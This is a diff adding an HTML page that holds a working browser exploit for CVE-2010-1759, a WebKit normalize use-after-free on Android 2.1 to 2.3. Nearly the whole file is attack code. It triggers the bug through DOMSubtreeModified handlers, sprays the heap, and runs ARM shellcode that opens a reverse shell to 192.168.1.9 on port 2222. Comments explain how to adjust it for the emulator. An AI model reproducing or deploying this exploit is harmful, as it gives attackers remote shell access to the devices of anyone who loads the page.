@@ -1,0 +1,122 @@
+<!--
+
+CVE-2010-1759 webkit normalize bug
+Tested on 
+	Moto Droidx2 running 2.2. Droidx2 running 2.3 is vulnerable but exploit fails due to non-executable heap. Still working on a way around that :)
+	2.1 - 2.3 emulator. The changes needed are documented in the code. The emulator is less consistent than the real phone
+Author: MJ Keith mjkeith[at]evilhippie.org
+
+-->
+<p>LOADING... </p>
+<div id="test1"></div>
+<div id="test2"></div>
+<div id="test3"></div>
+
+<script>
+
+
+var elem1 = document.getElementById("test1");
+var elem2 = document.getElementById("test2");
+var elem3 = document.getElementById("test3");
+
+function spray()
+{
+ 
+for (var i = 0; i < 180000; i++) {var s = new String(unescape("\u0052\u0052")); }   // "\u0056\u0056" FOR EMULATOR
+
+var scode = unescape("\u5200\u5200");  // "\u0058\u0058" FOR EMULATOR
+var scode2 = unescape("\u5005\ue1a0");
+var shell = unescape("\u0002\ue3a0\u1001\ue3a0\u2005\ue281\u708c\ue3a0\u708d\ue287\u0080\uef00\u6000\ue1a0\u1084\ue28f\u2010\ue3a0\u708d\ue3a0\u708e\ue287\u0080\uef00\u0006\ue1a0\u1000\ue3a0\u703f\ue3a0\u0080\uef00\u0006\ue1a0\u1001\ue3a0\u703f\ue3a0\u0080\uef00\u0006\ue1a0\u1002\ue3a0\u703f\ue3a0\u0080\uef00\u2001\ue28f\uff12\ue12f\u4040\u2717\udf80\ua005\ua508\u4076\u602e\u1b6d\ub420\ub401\u4669\u4052\u270b\udf80\u2f2f\u732f\u7379\u6574\u2f6d\u6962\u2f6e\u6873\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u2000\u0002");
+shell += unescape("\uae08"); // Port = 2222
+shell += unescape("\ua8c0\u0901"); // IP = 192.168.1.9    // "\u000a\u0202" FOR EMULATOR
+shell += unescape("\u2000\u2000"); // Port = 2222
+
+ do
+ {
+  scode += scode;
+  scode2 += scode2;
+
+ } while (scode.length<=0x1000);
+ 
+scode2 += shell
+ 
+        target = new Array();
+        for(i = 0; i < 141; i++){          // CHANGE 141 TO 201 FOR EMULATOR
+          
+            if (i<100){ target[i] = scode;}
+            if (i>100){ target[i] = scode2;}
+
+                  document.write(target[i]);
+                  document.write("<br />");
+                if (i>140){               // CHANGE 140 TO 200 FOR EMULATOR
+                      
+                         document.write("<br />");}
+
+    }
+}
+
+function handler1()
+{
+    elem1.removeAttribute("b");
+    spray();
+}
+
+
+
+function handler2()
+{
+    elem2.removeAttribute("b");
+    spray();
+}
+
+
+function handler3()
+{
+    elem3.removeAttribute("b");
+    spray();
+}
+
+
+
+
+function slowdown()
+{
+for (var i = 0; i < 120; i++) { console.log('slow' + i);
+
+
+            if (i > 110 ){ elem1.normalize(); elem2.normalize(); elem3.normalize();
+}
+}
+}
+
+
+
+elem1.setAttribute("b", "a");
+elem1.attributes[0].appendChild(document.createTextNode("hi"));
+elem1.attributes[0].addEventListener("DOMSubtreeModified", handler2,  false);
+document.body.offsetTop;
+
+
+slowdown();                  // COMMENT OUT THIS FUNCTION CALL FOR EMULATOR
+
+//elem1.normalize();           // UN-COMMENT THIS LINE FOR EMULATOR
+document.body.offsetTop;
+
+
+elem2.setAttribute("b", "a");
+elem2.attributes[0].appendChild(document.createTextNode("hi"));
+elem2.attributes[0].addEventListener("DOMSubtreeModified", handler2,  false);
+document.body.offsetTop;
+
+elem2.normalize();
+
+
+elem3.setAttribute("b", "a");
+elem3.attributes[0].appendChild(document.createTextNode("hi"));
+elem3.attributes[0].addEventListener("DOMSubtreeModified", handler3,  false);
+document.body.offsetTop;
+
+elem3.normalize();
+
+
+</script>
